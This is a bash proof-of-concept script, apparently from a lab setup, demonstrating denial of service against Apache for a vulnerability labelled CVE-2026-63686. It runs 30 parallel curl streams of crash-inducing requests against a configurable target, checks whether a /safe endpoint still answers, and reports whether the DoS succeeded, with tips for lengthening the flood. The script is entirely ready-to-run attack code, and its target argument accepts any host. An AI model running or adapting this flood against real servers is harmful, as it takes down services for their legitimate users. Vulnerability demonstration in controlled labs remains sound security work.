#!/bin/bash
# ============================================================
# CVE-2026-63686 — Denial of Service Demonstration
# ============================================================
# Demonstrates that sustained crash payloads overwhelm Apache's
# ability to respawn workers, causing denial of service.
#
# The script:
#   Phase 1: Confirms the server is alive
#   Phase 2: Starts a continuous flood of crash payloads
#   Phase 3: Tests /safe WHILE the flood is ongoing
#   Phase 4: Stops the flood, shows crash count
#
# Usage:
#   chmod +x dos.sh
#   ./dos.sh                    # default settings
#   ./dos.sh 10                 # flood duration in seconds
#   ./dos.sh 10 localhost:8080  # custom target
# ============================================================

DURATION="${1:-10}"
TARGET="${2:-localhost:8080}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo "============================================================"
echo "  CVE-2026-63686 — DoS Demonstration"
echo "============================================================"
echo ""
echo "  Target:   http://${TARGET}"
echo "  Duration: ${DURATION} seconds of sustained flood"
echo ""

# ── Phase 1: Confirm server is alive ──────────────────────
echo -e "${CYAN}[Phase 1] Verifying server is alive...${NC}"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "http://${TARGET}/safe" 2>/dev/null)
if [ "$HTTP_CODE" = "000" ]; then
    echo -e "${RED}[-] Server not reachable. Is the VM and poison.py running?${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Server is alive (HTTP ${HTTP_CODE})${NC}"
echo ""

# ── Phase 2: Start continuous flood in background ─────────
echo -e "${RED}[Phase 2] Starting sustained crash flood for ${DURATION} seconds...${NC}"

# Background function: continuously send crash payloads
# Multiple independent streams that never pause — each stream
# sends requests back-to-back without waiting for the others.
flood() {
    local end_time=$((SECONDS + DURATION))
    # Launch 30 independent flood streams
    for stream in $(seq 1 30); do
        (
            while [ $SECONDS -lt $end_time ]; do
                curl -s -o /dev/null --max-time 2 "http://${TARGET}/" 2>/dev/null
            done
        ) &
    done
    wait
}

# Start the flood in background
flood &
FLOOD_PID=$!

# Give the flood a moment to start killing workers
sleep 2

# ── Phase 3: Test /safe WHILE flood is running ────────────
echo ""
echo -e "${CYAN}[Phase 3] Testing /safe WHILE crash flood is active...${NC}"
echo ""

ALIVE=0
DEAD=0
TOTAL=10

for i in $(seq 1 $TOTAL); do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "http://${TARGET}/safe" 2>/dev/null)
    if [ "$HTTP_CODE" = "200" ]; then
        echo -e "  Request $i/${TOTAL}: HTTP ${HTTP_CODE} — ${YELLOW}responded${NC}"
        ALIVE=$((ALIVE + 1))
    elif [ "$HTTP_CODE" = "000" ]; then
        echo -e "  Request $i/${TOTAL}: HTTP ${HTTP_CODE} — ${GREEN}NO RESPONSE (DoS working)${NC}"
        DEAD=$((DEAD + 1))
    else
        echo -e "  Request $i/${TOTAL}: HTTP ${HTTP_CODE} — ${GREEN}error (workers exhausted)${NC}"
        DEAD=$((DEAD + 1))
    fi
    sleep 0.5
done

# ── Phase 4: Stop flood and report ────────────────────────
echo ""
echo -e "${CYAN}[Phase 4] Stopping flood...${NC}"
kill $FLOOD_PID 2>/dev/null
wait $FLOOD_PID 2>/dev/null

echo ""
echo "============================================================"
echo "  Results"
echo "============================================================"
echo ""
echo "  Legitimate requests (/safe) during flood: ${TOTAL}"
echo "  Succeeded: ${ALIVE}"
echo "  Failed:    ${DEAD}"
echo ""

if [ "$DEAD" -ge 5 ]; then
    echo -e "  ${RED}DoS CONFIRMED — ${DEAD}/${TOTAL} legitimate requests failed${NC}"
    echo "  The sustained crash flood exhausted Apache's worker pool."
elif [ "$DEAD" -ge 1 ]; then
    echo -e "  ${YELLOW}PARTIAL DoS — ${DEAD}/${TOTAL} legitimate requests failed${NC}"
    echo "  Workers were dying and respawning. Longer duration would amplify."
else
    echo -e "  ${YELLOW}Server survived — try longer duration: ./dos.sh 20${NC}"
fi

echo ""
echo "  Check total crash count:"
echo "    vagrant ssh -c \"sudo grep -c 'Segmentation fault' /var/log/apache2/error.log\""
echo ""
